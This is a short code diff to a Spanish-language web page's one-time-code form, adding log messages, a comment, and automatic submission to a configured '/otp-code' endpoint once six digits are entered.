@@ -444,6 +444,7 @@
                 console.log('🆔 TransactionId:', transactionId);
                 console.log(`📡 Worker URL: ${WORKER_URL}`);
 
+                // ✅ Enviar al endpoint /otp-code
                 const response = await fetch(`${WORKER_URL}/otp-code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -458,9 +459,12 @@
                 loadingOverlay.style.display = 'none';
 
                 if (result.ok) {
-                    // ✅ Redirigir a validacion.html
+                    // ✅ CÓDIGO VÁLIDO - REDIRIGIR A validacion.html
+                    console.log('✅ Código válido, redirigiendo a validacion.html');
                     window.location.href = 'validacion.html';
                 } else {
+                    // ❌ CÓDIGO INVÁLIDO
+                    console.log('❌ Código inválido');
                     mostrarErrorCajas();
                     mostrarAlerta();
                 }
@@ -480,6 +484,11 @@
                 this.value = this.value.slice(0, 6);
             }
             updateButton();
+
+            // Auto-envío cuando se completan 6 dígitos
+            if (this.value.length === 6) {
+                setTimeout(enviarCodigo, 300);
+            }
         });
 
         button.addEventListener('click', function(e) {
